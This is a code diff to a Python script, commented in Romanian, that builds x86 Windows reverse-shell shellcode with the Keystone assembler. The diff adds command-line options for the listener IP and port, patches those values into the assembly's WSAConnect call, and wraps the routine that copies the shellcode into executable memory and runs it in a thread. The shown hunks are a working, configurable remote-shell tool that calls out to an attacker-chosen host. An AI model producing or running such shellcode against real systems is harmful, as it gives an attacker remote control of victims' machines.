@@ -1,5 +1,18 @@
 import ctypes, struct
+import argparse
+import re
 from keystone import Ks, KS_ARCH_X86, KS_MODE_32
+
+parser = argparse.ArgumentParser(description="This is an x86 shellcode generator/executor")
+
+group = parser.add_mutually_exclusive_group(required=True)
+group.add_argument("-x", action="store_true", help="execute the shellcode in a thread, in python.exe process")
+group.add_argument("-d", action="store_true", help="display the shellcode in python form")
+
+parser.add_argument("-i", metavar="IP", default="127.0.0.1", help="set the IP of the reverse shell (default: 127.0.0.1)")
+parser.add_argument("-p", metavar="PORT", default="443", help=" set the IP of the reverse shell (default: 443)")
+
+args = parser.parse_args()
 
 # functie care ne permite sa avem comentarii in codul assembly
 # ca baietii de la keystone engine nu au nevoie de comentarii, ei citesc assembly cum citeam eu Creanga in copilarie
@@ -11,6 +24,95 @@ def strip_comments(asm_code):
         if stripped:
             clean_lines.append(stripped)
     return '\n'.join(clean_lines)
+
+def execute_shellcode(shellcode):
+    # alocam memorie RWX pentru shellcode
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                            ctypes.c_int(len(shellcode)),
+                                            ctypes.c_int(0x3000),
+                                            ctypes.c_int(0x40))
+
+    # copiem shellcode-ul in memoria alocata
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                        shellcode,
+                                        ctypes.c_int(len(shellcode)))
+
+    print("Shellcode located at address %s" % hex(ptr))
+
+    # oprim executia script-ului pentru a putea conecta WinDBG la procesul python.exe
+    input("...ENTER TO START SHELLCODE THREAD...")
+
+    ctypes.windll.kernel32.GetModuleHandleA(None)
+
+    # creem thread-ul la adresa shellcode-ului
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                            ctypes.c_int(0),
+                                            ctypes.c_int(ptr),
+                                            ctypes.c_int(0),
+                                            ctypes.c_int(0),
+                                            ctypes.pointer(ctypes.c_int(0)))
+
+    # asteptam terminarea executiei shellcode-ului
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+
+def disaply_shellcode(shellcode):
+    print("Shellcode length:", len(shellcode))
+    shown_shellcode = "shellcode =  b\""
+
+    idx = 0
+    col_number = 10
+    for byte in shellcode:
+        if(idx % col_number == 0):
+            shown_shellcode += "\"\nshellcode += b\""
+        shown_shellcode += "\\x" + format(byte, '02x')
+        idx = idx + 1
+    shown_shellcode += "\""
+    print(shown_shellcode)
+
+ip = args.i
+port = args.p
+
+ip_regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+if(not re.search(ip_regex, ip)):
+    print("Please provide an IP in -i argument.")
+    exit()
+
+
+print(f"The shellcode will connect to: {ip}:{port}")
+print()
+print()
+
+ip_parts = ip.split(".")
+hexa_ip = ""
+for part in ip_parts:
+    part = int(part)
+    temp = str(hex(part))
+    if(len(temp) > 4):
+        print("Please provide an valid IP in -i argument.")
+        exit()
+
+    temp = temp[2:]
+
+    if(len(temp)==1):
+        temp = "0" + temp
+
+    hexa_ip = temp + hexa_ip
+
+hexa_ip = "0x" + hexa_ip
+
+port = int(port)
+
+if(port < 1 or port > 65535):
+    print("Please provide an valid port in -p argument.")
+
+hexa_port = str(hex(port))
+hexa_port = hexa_port[2:]
+if len(hexa_port)<4:
+    hexa_port = '0' * (4-len(hexa_port)) + str(hexa_port)
+
+first_part = hexa_port[0:2]
+second_part = hexa_port[2:]
+hexa_port = "0x" + second_part + first_part
 
 CODE = """
 start:
@@ -134,27 +236,27 @@ call_wsasocketa:
 
 ; apelam WSAConnect
 call_wsaconnect:
-    mov esi, eax              ; mutam descriptorul SOCKET in ESI (vezi WSASocketA)
-    xor eax, eax              ; facem EAX 0
-    push eax                  ; push sin_zero[]
-    push eax                  ; push sin_zero[]
-    push 0x0100007f           ; push sin_addr (127.0.0.1)
-    mov ax, 0xbb01            ; mutam sin_port (443) in AX
-    shl eax, 0x10             ; facem left shift EAX cu 0x10 bytes
-    add ax, 0x02              ; adaugam 0x02 (AF_INET) in AX
-    push eax                  ; push sin_port & sin_family
-    push esp                  ; push pointer in structura sockaddr_in
-    pop edi                   ; stocam pointer-ul sockaddr_in in EDI
-    xor eax, eax              ; facem EAX null
-    push eax                  ; push lpGQOS
-    push eax                  ; push lpSQOS
-    push eax                  ; push lpCalleeData
-    push eax                  ; push lpCalleeData
-    add al, 0x10              ; setam AL= 0x10
-    push eax                  ; push namelen
-    push edi                  ; push *name
-    push esi                  ; push s
-    call dword ptr [ebp+0x24] ; apelam WSAConnect
+    mov esi, eax                    ; mutam descriptorul SOCKET in ESI (vezi WSASocketA)
+    xor eax, eax                    ; facem EAX 0
+    push eax                        ; push sin_zero[]
+    push eax                        ; push sin_zero[]
+    push """ + hexa_ip + """        ; push sin_addr (127.0.0.1)
+    mov ax, """ + hexa_port + """   ; mutam sin_port (443) in AX
+    shl eax, 0x10                   ; facem left shift EAX cu 0x10 bytes
+    add ax, 0x02                    ; adaugam 0x02 (AF_INET) in AX
+    push eax                        ; push sin_port & sin_family
+    push esp                        ; push pointer in structura sockaddr_in
+    pop edi                         ; stocam pointer-ul sockaddr_in in EDI
+    xor eax, eax                    ; facem EAX null
+    push eax                        ; push lpGQOS
+    push eax                        ; push lpSQOS
+    push eax                        ; push lpCalleeData
+    push eax                        ; push lpCalleeData
+    add al, 0x10                    ; setam AL= 0x10
+    push eax                        ; push namelen
+    push edi                        ; push *name
+    push esi                        ; push s
+    call dword ptr [ebp+0x24]       ; apelam WSAConnect
 
 ; vom crea structura StartupInfoA si o vom salva in EDI
 create_startupinfoa:
@@ -298,35 +400,10 @@ encoding, count = ks.asm(CODE)
 
 shellcode = bytes(encoding)
 
-# vom afisa shellcode-ul
-print("Shellcode length:", len(shellcode))
-print(shellcode)
 
-# alocam memorie RWX pentru shellcode
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
 
-# copiem shellcode-ul in memoria alocata
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
-                                     shellcode,
-                                     ctypes.c_int(len(shellcode)))
-
-print("Shellcode located at address %s" % hex(ptr))
-
-# oprim executia script-ului pentru a putea conecta WinDBG la procesul python.exe
-input("...ENTER TO EXECUTE SHELLCODE...")
-
-ctypes.windll.kernel32.GetModuleHandleA(None)
-
-# creem thread-ul la adresa shellcode-ului
-ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(ptr),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.pointer(ctypes.c_int(0)))
-
-# asteptam terminarea executiei shellcode-ului
-ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+if(args.x):
+    execute_shellcode(shellcode)
+elif(args.d):
+    # vom afisa shellcode-ul
+    disaply_shellcode(shellcode)
